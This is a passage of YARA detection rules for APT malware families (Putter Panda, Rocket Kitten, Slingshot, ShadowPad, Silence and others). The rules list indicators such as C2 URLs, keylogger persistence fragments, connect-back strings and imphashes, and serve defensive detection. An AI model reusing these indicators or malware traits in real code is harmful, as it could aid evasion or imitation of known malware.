vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PROMETHIUM_NEODYMIUM_Malware_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\windows\\\\temp\\\\winrar.exe\" fullword wide\n        $s2 = \"info@aadobetech.com\" fullword ascii\n        $s3 = \"%s\\\\ssleay32.dll\" fullword wide\n        $s4 = \"%s\\\\libeay32.dll\" fullword wide\n        $s5 = \"%s\\\\fprot32.exe\" fullword wide\n        $s6 = \"ADOBE Corp.1\" fullword ascii\n        $s7 = \"Adobe Flash Player1\\\"0 \" fullword ascii\n        $s8 = \"Windows Index Services\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and 4 of them) or (6 of them)\n}\n\nrule PROMETHIUM_NEODYMIUM_Malware_5\n{\n    meta:\n        description = \"PROMETHIUM and NEODYMIUM malware\"\n        threat_names = \"PROMETHIUM, NEODYMIUM\"\n        ref = \"https://goo.gl/8abDE6\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PROMETHIUM_NEODYMIUM_Malware_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Winxsys.exe\" fullword wide\n        $s2 = \"%s\\\\ssleay32.dll\" fullword wide\n        $s3 = \"%s\\\\libeay32.dll\" fullword wide\n        $s4 = \"Windows Index Services\" fullword wide\n        $s5 = \"<F RAT\" fullword ascii\n        $s6 = \"WININDX-088FA840-B10D-11D3-BC36-006067709674\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 5000KB and 3 of them)\n}\n\nrule PROMETHIUM_NEODYMIUM_Malware_6\n{\n    meta:\n        description = \"PROMETHIUM and NEODYMIUM malware\"\n        threat_names = \"PROMETHIUM, NEODYMIUM\"\n        ref = \"https://goo.gl/8abDE6\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PROMETHIUM_NEODYMIUM_Malware_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\Windows\\\\system32\\\\syswindxr32.dll\" fullword wide\n        $s2 = \"c:\\\\windows\\\\temp\\\\TrueCrypt-7.2.exe\" fullword wide\n        $s3 = \"%s\\\\ssleay32.dll\" fullword wide\n        $s4 = \"%s\\\\libeay32.dll\" fullword wide\n        $s5 = \"%s\\\\fprot32.exe\" fullword wide\n        $s6 = \"Windows Index Services\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 7000KB and 4 of them)\n}\n\nrule PutterPanda_Rel\n{\n    meta:\n        description = \"APT malware related to PutterPanda\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_Rel\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x0 = \"app.stream-media.net\" fullword ascii\n        $x1 = \"File %s does'nt exist or is forbidden to acess!\" fullword ascii\n        $s6 = \"GetProcessAddresss of pHttpQueryInfoA Failed!\" fullword ascii\n        $s7 = \"Connect %s error!\" fullword ascii\n        $s9 = \"Download file %s successfully!\" fullword ascii\n        $s10 = \"index.tmp\" fullword ascii\n        $s11 = \"Execute PE Successfully\" fullword ascii\n        $s13 = \"aa/22/success.xml\" fullword ascii\n        $s16 = \"aa/22/index.asp\" fullword ascii\n        $s18 = \"File %s a Non-Pe File\" fullword ascii\n        $s19 = \"SendRequset error!\" fullword ascii\n        $s20 = \"filelist[%d]=%s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and 1 of ($x*)) or (4 of ($s*))\n}\n\nrule PutterPanda_Rel_2\n{\n    meta:\n        description = \"APT Malware related to PutterPanda Group\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_Rel_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?\" fullword ascii\n        $s1 = \"http://update.konamidata.com/test/zl/sophos/td/index.dat?\" fullword ascii\n        $s2 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii\n        $s3 = \"Internet connect error:%d\" fullword ascii\n        $s4 = \"Proxy-Authorization:Basic\" fullword ascii\n        $s5 = \"HttpQueryInfo failed:%d\" fullword ascii\n        $s6 = \"read file error:%d\" fullword ascii\n        $s7 = \"downdll.dll\" fullword ascii\n        $s8 = \"rz.dat\" fullword ascii\n        $s9 = \"Invalid url\" fullword ascii\n        $s10 = \"Create file failed\" fullword ascii\n        $s11 = \"myAgent\" fullword ascii\n        $s12 = \"%s%s%d%d\" fullword ascii\n        $s13 = \"down file success\" fullword ascii\n        $s15 = \"error!\" fullword ascii\n        $s18 = \"Avaliable data:%u bytes\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and 6 of them\n}\n\nrule PutterPanda_PSAPI\n{\n    meta:\n        description = \"Malware related to PutterPanda\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_PSAPI\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"LOADER ERROR\" fullword ascii\n        $s1 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n        $s2 = \"psapi.dll\" fullword ascii\n        $s3 = \"urlmon.dll\" fullword ascii\n        $s4 = \"WinHttpGetProxyForUrl\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PutterPanda_WUAUCLT\n{\n    meta:\n        description = \"Malware related to PutterPanda\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_WUAUCLT\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x0 = \"WUAUCLT.EXE\" fullword wide\n        $x1 = \"%s\\\\tmp%d.exe\" fullword ascii\n        $x2 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n        $s1 = \"Microsoft Windows Operating System\" fullword wide\n        $s2 = \"InternetQueryOptionA\" fullword ascii\n        $s3 = \"LookupPrivilegeValueA\" fullword ascii\n        $s4 = \"WNetEnumResourceA\" fullword ascii\n        $s5 = \"HttpSendRequestExA\" fullword ascii\n        $s6 = \"PSAPI.DLL\" fullword ascii\n        $s7 = \"Microsoft(R) Windows(R) Operating System\" fullword wide\n        $s8 = \"CreatePipe\" fullword ascii\n        $s9 = \"EnumProcessModules\" fullword ascii\n\n    condition:\n        all of ($x*) or (1 of ($x*) and all of ($s*))\n}\n\nrule PutterPanda_Gen1\n{\n    meta:\n        description = \"Malware related to PutterPanda\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"YarGen Rule Generator\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%s%duserid=%dthreadid=%dgroupid=%d\" fullword ascii\n        $s2 = \"ssdpsvc.dll\" fullword ascii\n        $s3 = \"Fail %s \" fullword ascii\n        $s4 = \"%s%dpara1=%dpara2=%dpara3=%d\" fullword ascii\n        $s5 = \"LsaServiceInit\" fullword ascii\n        $s6 = \"%-8d Fs %-12s Bs \" fullword ascii\n        $s7 = \"Microsoft DH SChannel Cryptographic Provider\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them\n}\n\nrule PutterPanda_MsUpdater_3\n{\n    meta:\n        description = \"Malware related to PutterPanda - MSUpdater\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_MsUpdater_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"msupdater.exe\" fullword ascii\n        $s1 = \"Explorer.exe \\\"\" fullword ascii\n        $s2 = \"FAVORITES.DAT\" fullword ascii\n        $s4 = \"COMSPEC\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and 3 of them\n}\n\nrule PutterPanda_MsUpdater_1\n{\n    meta:\n        description = \"Malware related to PutterPanda - MSUpdater\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_MsUpdater_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x0 = \"msupdate.exe\" fullword wide\n        $x1 = \"msupdate\" fullword wide\n        $s1 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n        $s2 = \"Automatic Updates\" fullword wide\n        $s3 = \"VirtualProtectEx\" fullword ascii\n        $s4 = \"Invalid parameter\" fullword ascii\n        $s5 = \"VirtualAllocEx\" fullword ascii\n        $s6 = \"WriteProcessMemory\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and 1 of ($x*) and 4 of ($s*)) or (1 of ($x*) and all of ($s*))\n}\n\nrule PutterPanda_MsUpdater_2\n{\n    meta:\n        description = \"Malware related to PutterPanda - MSUpdater\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_MsUpdater_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"winsta0\\\\default\" fullword ascii\n        $s1 = \"EXPLORER.EXE\" fullword ascii\n        $s2 = \"WNetEnumResourceA\" fullword ascii\n        $s3 = \"explorer.exe\" fullword ascii\n        $s4 = \"CreateProcessAsUserA\" fullword ascii\n        $s5 = \"HttpSendRequestExA\" fullword ascii\n        $s6 = \"HttpEndRequestA\" fullword ascii\n        $s7 = \"GetModuleBaseNameA\" fullword ascii\n        $s8 = \"GetModuleFileNameExA\" fullword ascii\n        $s9 = \"HttpSendRequestA\" fullword ascii\n        $s10 = \"HttpOpenRequestA\" fullword ascii\n        $s11 = \"InternetConnectA\" fullword ascii\n        $s12 = \"Process32Next\" fullword ascii\n        $s13 = \"Process32First\" fullword ascii\n        $s14 = \"CreatePipe\" fullword ascii\n        $s15 = \"EnumProcesses\" fullword ascii\n        $s16 = \"LookupPrivilegeValueA\" fullword ascii\n        $s17 = \"PeekNamedPipe\" fullword ascii\n        $s18 = \"EnumProcessModules\" fullword ascii\n        $s19 = \"PSAPI.DLL\" fullword ascii\n        $s20 = \"SPSSSQ\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and all of them\n}\n\nrule PutterPanda_Gen4\n{\n    meta:\n        description = \"Malware related to PutterPanda\"\n        threat_names = \"Putter Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Malware_PutterPanda_Gen4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"rz.dat\" fullword ascii\n        $s0 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii\n        $s1 = \"Internet connect error:%d\" fullword ascii\n        $s2 = \"Proxy-Authorization:Basic \" fullword ascii\n        $s5 = \"Invalid url\" fullword ascii\n        $s6 = \"Create file failed\" fullword ascii\n        $s7 = \"myAgent\" fullword ascii\n        $z1 = \"%s%s%d%d\" fullword ascii\n        $z2 = \"HttpQueryInfo failed:%d\" fullword ascii\n        $z3 = \"read file error:%d\" fullword ascii\n        $z4 = \"down file success\" fullword ascii\n        $z5 = \"kPStoreCreateInstance\" fullword ascii\n        $z6 = \"Avaliable data:%u bytes\" fullword ascii\n        $z7 = \"abe2869f-9b47-4cd9-a358-c22904dba7f7\" fullword ascii\n\n    condition:\n        filesize < 300KB and ((uint16(0) == 0x5a4d and $x1 and 3 of ($s*)) or (3 of ($s*) and 4 of ($z*)))\n}\n\nrule RocketKitten_CoreImpact_sysdll_exe\n{\n    meta:\n        description = \"Malware sysdll.exe from the Rocket Kitten APT\"\n        threat_names = \"Rocket Kitten, APT35\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CoreImpact_sysdll_exe\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"d:\\\\nightly\\\\sandbox_avg10_vc9_SP1_2011\\\\source\\\\avg10\\\\avg9_all_vs90\\\\bin\\\\Rele\" ascii\n        $x1 = \"Mozilla/5.0\" fullword ascii\n        $x2 = \"index.php?c=%s&r=%lx&u=1&t=%s\" fullword ascii\n        $x3 = \"index.php?c=%s&r=%lx\" fullword ascii\n        $x4 = \"index.php?c=%s&r=%x\" fullword ascii\n        $x5 = \"127.0.0.1\" fullword ascii\n        $x6 = \"/info.dat\" fullword ascii\n        $z1 = \"Content-Type: multipart/form-data; boundary=%S\" fullword wide\n        $z2 = \"Encountered error sending error message to client\" fullword ascii\n        $z3 = \"Encountered error building error message to client\" fullword ascii\n        $z4 = \"Attempting to unlock uninitialized lock!\" fullword ascii\n        $z5 = \"connect_back_tcp_channel#do_connect:: Error resolving connect back hostname\" fullword ascii\n        $z6 = \"select_event_get(): fd not found\" fullword ascii\n        $z7 = \"Encountered error sending syscall response to client\" fullword ascii\n        $z8 = \"GetProcAddress() error\" fullword ascii\n        $z9 = \"Error entering thread lock\" fullword ascii\n        $z10 = \"Error exiting thread lock\" fullword ascii\n        $z11 = \"connect_back_tcp_channel_init:: socket() failed\" fullword ascii\n        $z12 = \"event_add() failed for ev.\" fullword ascii\n        $z13 = \"Uh, oh, exit() failed\" fullword ascii\n        $z14 = \"event_add() failed for ev.\" fullword ascii\n        $z15 = \"event_add() failed.\" fullword ascii\n        $z16 = \"needroot\" fullword ascii\n        $z17 = \"./plugins/\" fullword ascii\n\n    condition:\n        $s0 or all of ($x*) or 8 of ($z*)\n}\n\nrule RocketKitten_Keylogger\n{\n    meta:\n        description = \"Keylogger used in Rocket Kitten APT\"\n        ref = \"https://goo.gl/SjQhlp\"\n        threat_names = \"Rocket Kitten, APT35\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RocketKitten_Keylogger\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\CWoolger.pdb\" ascii\n        $x2 = \"WoolenLoger\\\\obj\\\\x86\\\\Release\" ascii\n        $x3 = \"D:\\\\Yaser Logers\\\\\"\n        $z1 = \"woolger\" fullword wide\n        $s1 = \"oShellLink.TargetPath = \\\"\" fullword ascii\n        $s2 = \"wscript.exe \" fullword ascii\n        $s3 = \"strSTUP = WshShell.SpecialFolders(\\\"Startup\\\")\" fullword ascii\n        $s4 = \"[CapsLock]\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*) or ($z1 and 2 of ($s*)))) or ($z1 and all of ($s*))\n}\n\nrule ShadowPad_nssock2\n{\n    meta:\n        description = \"Malicious nssock2.dll from ShadowPad incident\"\n        threat_names = \"ShadowPad\"\n        ref = \"https://securelist.com/shadowpad-in-corporate-networks/81432/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ShadowPad_nssock2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and (pe.imphash() == \"c67de089f2009b21715744762fc484e8\" or pe.imphash() == \"11522f7d4b2fc05acba8f534ca1b828a\"))\n}\n\nrule Silence_malware_1\n{\n    meta:\n        description = \"Malware sample mentioned in Silence report on Securelist\"\n        threat_names = \"Silence\"\n        ref = \"https://securelist.com/the-silence/83009/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Silence_malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"adobeudp.exe\" fullword wide\n        $x2 = \"%s\\\\adobeudp.exeZone.Identifier\" fullword ascii\n        $x3 = \"%s\\\\igfxpers_%08x.exe\" fullword ascii\n        $x4 = \"%s\\\\adobeudp.exe\" fullword ascii\n        $s1 = \"SoftWare\\\\MicroSoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword ascii\n        $s2 = \"Copyright (C)  1999 - 2017\" fullword wide\n        $s3 = \"%sget.php?name=%x\" fullword ascii\n        $s4 = \"VNASSRUNXYC\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (pe.imphash() == \"e03edb9bd7cbe200dc59f361db847f8a\" or 1 of ($x*) or 3 of them)\n}\n\nrule Silence_malware_2\n{\n    meta:\n        description = \"Malware sample mentioned in Silence report on Securelist\"\n        threat_names = \"Silence\"\n        ref = \"https://securelist.com/the-silence/83009/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Silence_malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\ScreenMonitorService\\\\Release\\\\smmsrv.pdb\" ascii\n        $x2 = \"\\\\\\\\.\\\\pipe\\\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}\" fullword ascii\n        $s1 = \"My Sample Service: ServiceMain: SetServiceStatus returned error\" fullword ascii\n        $s2 = \"\\\\mss.exe\" fullword ascii\n        $s3 = \"\\\\out.dat\" fullword ascii\n        $s4 = \"\\\\mss.txt\" fullword ascii\n        $s5 = \"Default monitor\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and (pe.imphash() == \"69f3ec173efb6fd3ab5f79e0f8051335\" or (1 of ($x*) or 3 of them))) or (5 of them)\n}\n\nrule Slingshot_APT_Spork_Downloader\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Spork_Downloader\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage: spork -c IP:PORT\" fullword ascii wide\n        $s2 = \"connect-back IP address and port number\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Slingshot_APT_Minisling\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Minisling\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"{6D29520B-F138-442e-B29F-A4E7140F33DE}\" fullword ascii wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Slingshot_APT_Ring0_Loader\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Ring0_Loader\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \" -> Missing element in DataDir -- cannot install\" ascii\n        $s2 = \" -> Primary loader not present in the DataDir\" ascii\n        $s3 = \"\\\\\\\\.\\\\amxpci\" fullword ascii\n        $s4 = \" -> [Goad] ERROR in CreateFile:\" fullword ascii\n        $s5 = \"\\\\\\\\.\\\\Sandra\" fullword ascii\n        $s6 = \" -> [Sandra] RingZeroCode\" fullword ascii\n        $s7 = \" -> [Sandra] Value from IOCTL_RDMSR:\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Slingshot_APT_Malware_1\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SlingDll.dll\" fullword ascii\n        $s2 = \"BogusDll.\" ascii\n        $s3 = \"smsvcrt -h 0x%p\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and (pe.imphash() == \"7ead4bb0d752003ce7c062adb7ffc51a\" or pe.exports(\"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW0000\") or 1 of them)\n}\n\nrule Slingshot_APT_Malware_2\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\\\\\?\\\\c:\\\\RECYCLER\\\\S-1-5-21-2225084468-623340172-1005306204-500\\\\INFO5\" fullword wide\n        $x_slingshot = {09 46 BE 57 42 DD 70 35 5E }\n        $s1 = \"Opening service %s for stop access failed.#\" fullword wide\n        $s2 = \"LanMan setting <%s> is ignored because system has a higher value already.\" fullword wide\n        $s3 = \"\\\\DosDevices\\\\amxpci\" fullword wide\n        $s4 = \"lNTLMqSpPD\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and (1 of ($x*) or 4 of them)\n}\n\nrule Slingshot_APT_Malware_3\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Malware_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"chmhlpr.dll\" fullword ascii\n        $s2 = \"%hc%hc%hc%hc\" fullword ascii\n        $s3 = \"%hc%hc%hc=\" fullword ascii\n        $s4 = \"%hc%hc==\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (pe.imphash() == \"2f3b3df466e24e0792e0e90d668856bc\" or pe.exports(\"dll_u\") or ($a1 and 2 of ($s*)))\n}\n\nrule Slingshot_APT_Malware_4\n{\n    meta:\n        description = \"Malware from Slingshot APT\"\n        ref = \"https://securelist.com/apt-slingshot/84312/\"\n        threat_names = \"Slingshot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Slingshot_APT_Malware_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Ss -a 4104 -s 257092 -o 8 -l 406016 -r 4096 -z 315440\" fullword wide\n        $s1 = \"Slingshot\" fullword ascii\n        $s2 = \"\\\\\\\\?\\\\e:\\\\$Recycle.Bin\\\\\" wide\n        $s3 = \"LineRecs.reloc\" fullword ascii\n        $s4 = \"EXITGNG\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and ($x1 or 2 of them)\n}\n\nrule SphinxMoth_cudacrt\n{\n    meta:\n        description = \"Sphinx Moth threat group file cudacrt.dll\"\n        ref = \"www.kudelskisecurity.com\"\n        threat_names = \"Sphinx Moth\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kudelski Security - Nagravision SA\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sphinx_Moth_cudacrt\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"HPSSOEx.dll\" fullword wide\n        $s1 = \"255.255.255.254\" fullword wide\n        $s2 = \"SOFTWARE\\\\SsoAuth\\\\Service\" fullword wide\n        $op0 = { ff 15 5f de 00 00 48 8b f8 48 85 c0 75 0d 48 8b }\n        $op1 = { 45 33 c9 4c 8d 05 a7 07 00 00 33 d2 33 c9 ff 15 }\n        $op2 = { e8 7a 1c 00 00 83 f8 01 74 17 b9 03 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 243KB and all of ($s*) and 1 of ($op*)\n}\n\nrule SphinxMoth_h2t\n{\n    meta:\n        description = \"Sphinx Moth threat group file h2t.dat\"\n        ref = \"www.kudelskisecurity.com\"\n        threat_names = \"Sphinx Moth\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kudelski Security - Nagravision SA (modified by Florian Roth)\"\n        source = 